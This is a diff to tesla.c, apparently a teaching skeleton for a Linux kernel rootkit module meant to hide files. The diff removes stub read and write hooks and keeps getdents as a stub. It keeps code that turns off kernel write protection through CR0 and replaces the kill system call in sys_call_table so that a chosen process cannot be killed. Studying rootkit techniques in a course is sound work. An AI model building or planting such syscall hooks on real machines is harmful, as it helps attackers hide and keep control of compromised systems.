@@ -1,5 +1,5 @@
 /*
- * tesla.c -- a kernel module which hides files and processes.
+ * tesla.c -- a kernel module which hides specific files.
  */
 #include <linux/module.h> /* for every kernel module */
 #include <linux/kernel.h> /* printk() */
@@ -16,24 +16,13 @@ MODULE_AUTHOR("Jidong Xiao"); /* change this line to your name */
 MODULE_LICENSE("GPL v2");
 
 /* asmlinkage tells gcc that function parameters will not be in registers, but rather they will be in the stack. */
-
-asmlinkage long tesla_read(unsigned int fd, char __user *buf, size_t count)
-{
-	return 0;
-}
-
-asmlinkage long tesla_write(unsigned int fd, char __user *buf, size_t count)
-{
-	return 0;
-}
-
+/* we intercept getdents so as to hide specific files. */
 asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
 {
     return 0;
 }
 
 /* we intercept kill so that our process can not be killed */
-
 asmlinkage long tesla_kill(pid_t pid, int sig)
 {
 	int ret;
@@ -47,7 +36,7 @@ asmlinkage long tesla_kill(pid_t pid, int sig)
 		}
 	}
 
-	ret=orig_kill(pid, sig);
+	ret = orig_kill(pid, sig);
 	return ret;
 }
 
@@ -80,7 +69,7 @@ int tesla_init(void)
 	write_cr0(read_cr0() & (~0x10000));
 
 	/* save the original kill system call into orig_kill, and replace the kill system call with tesla_kill */
-	orig_kill= (void *)sys_call_table[__NR_kill];
+	orig_kill = (void *)sys_call_table[__NR_kill];
 	sys_call_table[__NR_kill] = (long *)tesla_kill;
 
 	/* set bit 16 of cr0, so as to turn the write protection on */
